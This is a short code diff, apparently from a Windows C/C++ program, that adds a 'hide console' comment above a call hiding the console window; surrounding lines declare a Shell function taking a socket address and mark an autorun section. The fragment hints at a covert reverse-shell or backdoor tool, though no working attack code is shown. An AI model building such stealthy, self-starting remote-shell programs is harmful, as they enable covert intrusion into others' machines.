@@ -28,6 +28,7 @@ int Shell(SOCKADDR_IN addr);
 
 
 int main() {
+	// hide console
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	setlocale(LC_ALL, "Russian");
 	// autorun
